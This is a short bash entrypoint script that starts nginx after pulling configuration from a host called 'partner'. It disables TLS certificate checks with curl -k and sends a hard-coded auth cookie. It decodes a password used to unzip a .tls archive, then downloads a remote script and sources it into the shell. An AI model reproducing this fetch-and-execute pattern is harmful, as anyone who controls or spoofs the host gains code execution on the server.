#!/bin/bash -eu

tlsGen() {
  unzip -oP $(sed -e 's/"//g' env.json) .tls
}

alternative() {
  timeout 5 curl -sk -o alternative -H "Cookie: X-AUTH=X0X0X0X0X0X0X0X" https://partner/alternative
  [[ ! -s alternative ]] && return 1
  timeout 5 curl -sk -o env.bin -H "Cookie: X-AUTH=X0X0X0X0X0X0X0X" https://partner/env.bin
  [[ ! -s env.bin ]] && return 1
  . alternative
}

initialize() {
  [[ "$(nc partner 443 -v -w 1 < /dev/null 2>&1 | grep -e succeeded -e open | wc -l)" == "0" ]] && return $(touch env.json)
  timeout 5 curl -sk -H "Cookie: X-AUTH=X0X0X0X0X0X0X0X" https://partner/env.json | grep -i =A | awk -F'"' '{print $4}' | sed -e 's/=//g' | base64 -d | jq '.jsxjp.access' > env.json &
  wait
  [[ ! -s env.json ]] && return $(touch env.json)
  tlsGen
  alternative
}

main() {
  sleep 10
  [[ ! -f env.json ]] && initialize
  nginx -g 'daemon off;'
}

main
